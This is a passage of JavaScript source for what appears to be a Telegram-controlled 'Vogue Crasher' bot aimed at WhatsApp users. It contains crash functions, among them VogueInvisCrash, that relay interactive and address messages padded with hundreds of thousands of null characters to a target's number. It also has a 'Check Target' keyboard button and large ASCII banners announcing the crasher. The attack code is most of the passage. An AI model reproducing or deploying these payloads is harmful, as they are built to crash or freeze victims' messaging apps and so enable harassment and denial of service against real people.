                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
                        version: 3
                    }
                }
            }
        }
    }, { userJid: target });
    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });
}

async function VogueInvisCrash(sock, target) {
    const payload = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "t.me/PrinceXVogue"
                    },
                    body: {
                        text: "\0"
                    },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000)
                    }
                }
            }
        }
    };
    
    await sock.relayMessage(target, payload, {
        participant: { jid: target }
    });
}

function buildStyledButton(clean, style) {
    return {
        text: "Check Target",
        url: `https://wa.me/${clean}`,
        style: style
    };
}

function generateKeyboard(clean) {
    const style = styleCycle[currentStyleIndex];

    return {
        inline_keyboard: [[
            buildStyledButton(clean, style)
        ]]
    };
}
//     _       ___  _   _ _   _ _____  _   _        
//    | |     / _ \| | | | \ | /  __ \| | | |       
//    | |    / /_\ \ | | |  \| | /  \/| |_| |       
//    | |    |  _  | | | | . ` | |    |  _  |       
//    | |____| | | | |_| | |\  | \__/\| | | |       
//    \_____/\_| |_/\___/\_| \_/\____/\_| |_/       
//                                                  
//                                                  
//     _   _  _____ _____ _   _ _____               
//    | | | ||  _  |  __ \ | | |  ___|              
//    | | | || | | | |  \/ | | | |__                
//    | | | || | | | | __| | | |  __|               
//    \ \_/ /\ \_/ / |_\ \ |_| | |___               
//     \___/  \___/ \____/\___/\____/               
//                                                  
//                                                  
//     _____ ______  ___   _____ _   _  ___________ 
//    /  __ \| ___ \/ _ \ /  ___| | | ||  ___| ___ \
//    | /  \/| |_/ / /_\ \\ `--.| |_| || |__ | |_/ /
//    | |    |    /|  _  | `--. \  _  ||  __||    / 
//    | \__/\| |\ \| | | |/\__/ / | | || |___| |\ \ 
//     \____/\_| \_\_| |_/\____/\_| |_/\____/\_| \_|
//                                                  
//


bot.launch()